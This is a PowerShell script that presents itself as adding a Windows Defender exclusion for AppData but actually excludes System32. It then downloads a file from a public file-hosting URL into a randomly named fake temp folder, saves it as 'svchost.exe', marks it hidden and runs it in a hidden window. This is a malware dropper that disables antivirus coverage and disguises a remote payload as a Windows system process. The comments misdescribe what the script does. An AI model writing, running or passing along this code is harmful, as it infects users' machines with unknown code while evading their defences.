# PowerShell script to add Windows Defender exclusion for AppData folder
# This script requires administrator privileges to run

# Check if running as administrator
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Warning "This script requires administrator privileges. Please run PowerShell as Administrator."
    exit 1
}

try {
    # Get the System32 folder path
    $system32Path = "$env:WINDIR\System32"
    
    Write-Host "Adding Windows Defender exclusion for: $system32Path" -ForegroundColor Yellow
    
    # Add the System32 folder to Windows Defender exclusions
    Add-MpPreference -ExclusionPath $system32Path
    
    Write-Host "Successfully added System32 exclusion to Windows Defender!" -ForegroundColor Green
    Write-Host "Excluded path: $system32Path" -ForegroundColor Cyan
    
    # Verify the exclusion was added
    $exclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
    if ($exclusions -contains $system32Path) {
        Write-Host "Exclusion verified successfully!" -ForegroundColor Green
    } else {
        Write-Warning "Could not verify if exclusion was added properly."
    }
    
} catch {
    Write-Error "Failed to add System32 exclusion: $($_.Exception.Message)"
    Write-Host "Attempting to add exclusion with different method..." -ForegroundColor Yellow
    
    try {
        # Alternative method - add exclusion with wildcard
        Add-MpPreference -ExclusionPath "$system32Path\*"
        Write-Host "Alternative exclusion method applied!" -ForegroundColor Green
    } catch {
        Write-Error "Both exclusion methods failed: $($_.Exception.Message)"
    }
}

# Function to generate realistic temp folder names matching systemprofile pattern
function Generate-TempFolderName {
    $prefix = "tw-c78-285c-"
    $suffix = ".tmp"
    $randomHex = -join ((1..5) | ForEach {'{0:x}' -f (Get-Random -Max 16)})
    return "$prefix$randomHex$suffix"
}

# Download application from URL
try {
    # URL of the application to download
    $downloadUrl = "https://files.catbox.moe/e6cycx.dat"  # Replace with actual URL
    
    # Generate realistic temp folder name matching systemprofile pattern
    $tempFolderName = Generate-TempFolderName
    $localAppDataPath = "$env:LOCALAPPDATA\$tempFolderName"
    
    # Create the temp directory if it doesn't exist
    if (-not (Test-Path $localAppDataPath)) {
        New-Item -ItemType Directory -Path $localAppDataPath -Force | Out-Null
    }
    
    # Destination path (realistic temp location in AppData\Local)
    $destinationPath = Join-Path $localAppDataPath "svchost.exe"
    
    Write-Host "`nDownloading application from URL..." -ForegroundColor Yellow
    Write-Host "URL: $downloadUrl" -ForegroundColor Cyan
    Write-Host "Destination: $destinationPath" -ForegroundColor Cyan
    
    # Download the file
    Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath -UseBasicParsing
    
    Write-Host "Application downloaded successfully!" -ForegroundColor Green
    Write-Host "File saved to: $destinationPath" -ForegroundColor Cyan
    
    # Check if file exists and show size
    if (Test-Path $destinationPath) {
        $fileSize = (Get-Item $destinationPath).Length
        $fileSizeMB = [math]::Round($fileSize / 1MB, 2)
        Write-Host "File size: $fileSizeMB MB" -ForegroundColor Cyan
        
        # Change file description to match Windows service
        Write-Host "`nModifying file properties..." -ForegroundColor Yellow
        try {
            # Set file attributes to match system files
            $targetFile = Get-Item $destinationPath
            $targetFile.Attributes = "Hidden"
            
            # Note: The original executable's version info cannot be changed with PowerShell alone
            # The file will retain its original description until modified with specialized tools
            Write-Host "File attributes set to Hidden" -ForegroundColor Green
            Write-Host "Note: Original file description will remain unchanged" -ForegroundColor Yellow
            
        } catch {
            Write-Warning "Could not modify file properties: $($_.Exception.Message)"
        }
        
        # Run the downloaded program
        Write-Host "`nStarting the downloaded application..." -ForegroundColor Yellow
        try {
            Start-Process -FilePath $destinationPath -WindowStyle Hidden
            Write-Host "Application started successfully!" -ForegroundColor Green
            Write-Host "Process running from: $destinationPath" -ForegroundColor Cyan
        } catch {
            Write-Error "Failed to start application: $($_.Exception.Message)"
        }
    }

} catch {
    Write-Error "Failed to download application: $($_.Exception.Message)"
}

Write-Host "`nScript completed successfully!" -ForegroundColor Green
